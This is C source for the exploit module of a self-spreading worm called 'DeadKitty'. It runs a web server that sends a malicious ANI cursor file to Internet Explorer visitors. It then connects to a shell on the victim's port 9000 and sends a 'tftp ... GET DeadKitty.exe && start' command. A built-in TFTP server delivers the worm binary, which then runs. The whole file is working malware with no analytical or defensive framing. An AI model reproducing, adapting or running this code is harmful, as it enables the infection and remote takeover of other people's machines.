   /* The ANI exploiter module */

   #include "DeadKitty.h"

   typedef struct
   {
       SOCKET sock;
       struct sockaddr_in clientInf;
   }T4rget;

   /* check flag */
   int IsTFTPActive = 0;

   /* a small tftpd server */
   DWORD WINAPI Th_tftpd(LPVOID Data)
   {
       SOCKET sock;
       struct sockaddr_in tftpd_inf,victim;
       DWORD WormSize = 0;
       char tmp[516],*Packet = NULL;
       HANDLE file = NULL;
       DWORD BlockCnt = 1,ReadBytes,size = sizeof(struct sockaddr_in);
       short OpCode,BlockId;


       if((sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) == INVALID_SOCKET)
       {
           IsTFTPActive = 0;
           ExitThread(0);
       }

       tftpd_inf.sin_family = AF_INET;
       tftpd_inf.sin_port = htons(69);
       tftpd_inf.sin_addr.s_addr = htonl(INADDR_ANY);

   #define FAIL closesocket(sock); \
                IsTFTPActive = 0; \
                ExitThread(0);

       if(bind(sock,(struct sockaddr *)&tftpd_inf,sizeof(struct sockaddr_in)) < 0)
       {
           FAIL
       }


       /* I read the request packet, but I do not care about it */
       if(recvfrom(sock,tmp,516,0,&victim,&size) == SOCKET_ERROR)
       {
           FAIL
       }



       file = CreateFile(DeadKittyPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,
           FILE_ATTRIBUTE_NORMAL,NULL);

       if(file == INVALID_HANDLE_VALUE)
       {
           FAIL
       }



       /* check flage */
       IsTFTPActive = 1;

       do
       {
           /* read a block of 512 bytes */
           memset(tmp,0,516);
           ReadFile(file,tmp,512,&ReadBytes,NULL);

           if((Packet = GlobalAlloc(GMEM_ZEROINIT|GMEM_FIXED,ReadBytes+4)) == NULL)
           {
               CloseHandle(file);
               FAIL
           }

           OpCode = htons(3); /* DATA opcode */
           BlockId = htons(BlockCnt);

           memcpy(Packet,&OpCode,2);
           memcpy(Packet+2,&BlockId,2);
           memcpy(Packet+4,tmp,ReadBytes);

           /* send the block */
           if(sendto(sock,Packet,4+ReadBytes,0,&victim,size) == SOCKET_ERROR)
           {
               CloseHandle(file);
               FAIL
           }

           GlobalFree(Packet);
           Sleep(300);
           BlockCnt++;

       }while(ReadBytes == 512);

       /* all done */
       CloseHandle(file);
       closesocket(sock);
       IsTFTPActive = 0;
       ExitThread(1);
   }

   /* this functions will connect back to victim to download & execute the worm */
   void GoToVictim(char *backip)
   {
       struct sockaddr_in victim;
       SOCKET sock;
       char cmd[128],rnd[7];
       DWORD tftpdId;

       if((sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) == INVALID_SOCKET)
       {
           ExitThread(0);
       }

       victim.sin_family = AF_INET;
       victim.sin_addr.s_addr = inet_addr(backip);
       victim.sin_port = htons(9000); /* the shell is on this port */

       if(connect(sock,(struct sockaddr *)&victim,sizeof(struct sockaddr_in)) != SOCKET_ERROR)
       {
           CreateThread(NULL,0,&Th_tftpd,0,0,&tftpdId); /* start my tftpd */

           srand(GetTickCount() ^ GetCurrentProcessId()); /* initialize random number generator */
           sprintf(rnd,"%d%d%d%d.exe",rand()%10,rand()%10,
               rand()%10,rand()%10);
           sprintf(cmd,"tftp -i %s GET DeadKitty.exe %s && start %s\n",GlobalIP,rnd,rnd);
           send(sock,cmd,strlen(cmd),0); /* send the infamous command ! */

           WAIT(1); /* 1 minute should be enough */
       }

       closesocket(sock);
   }


   DWORD WINAPI Th_HandleRequest(LPVOID Data)
   {
       T4rget *victim = (T4rget *)Data;
       char ClientRequest[512];
       char MyBuf[128],*backip;
       int ANIrequested = 0;

       recv(victim->sock,ClientRequest,512,0);
       backip = inet_ntoa(victim->clientInf.sin_addr);

       /* is it IE? */
       if(strstr(ClientRequest,"MSIE"))
       {
           ANIrequested = strstr(ClientRequest,"DeadKitty.ani") ? 1 : 0;

           sprintf(MyBuf,"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: %d\r\n\r\n",
               (ANIrequested) ? ANI_PIC_SIZE : HTML_SIZE);
           send(victim->sock,MyBuf,strlen(MyBuf),0);

           /* only one tftp session at time */
           if(ANIrequested && !IsTFTPActive)
           {

               /* send ANI pic */
               send(victim->sock,evil_ANI,ANI_PIC_SIZE,0);

               /* sleep a bit */
               WAIT_sec(5); /* 5 seconds */

               /* here we must be lucky :) */
               GoToVictim(backip);

           }

           else
           {
               /* send html code */
               send(victim->sock,evil_HTML,HTML_SIZE,0);
           }
       }


       closesocket(victim->sock);
   }

   /* the server's code */
   DWORD WINAPI Th_ANIExploiter(LPVOID Data)
   {
       SOCKET server_sock,client_sock;
       struct sockaddr_in webserver;
       T4rget inf;
       DWORD HandleRequestId,size = sizeof(inf.clientInf);

       if((server_sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) == INVALID_SOCKET)
       {
           ExitThread(0);
       }

       webserver.sin_port = htons(EVIL_WEBSERVER_PORT);
       webserver.sin_family = AF_INET;
       webserver.sin_addr.s_addr = htonl(INADDR_ANY);

       if(bind(server_sock,(struct sockaddr_in *)&webserver,
           sizeof(struct sockaddr_in)) < 0)
       {
           ExitThread(0);
       }

       listen(server_sock,SOMAXCONN);

       /* main server loop */
       do
       {
           client_sock = accept(server_sock,&inf.clientInf,&size);

           /* start request handling thread */
           inf.sock = client_sock;
           CreateThread(NULL,0,&Th_HandleRequest,&inf,0,&HandleRequestId);


       }while(1);
   }

   void ANIExploiter(void)
   {
       DWORD ANIExploiterId;

       /* start thread */
       CreateThread(NULL,0,&Th_ANIExploiter,0,0,&ANIExploiterId);
   }
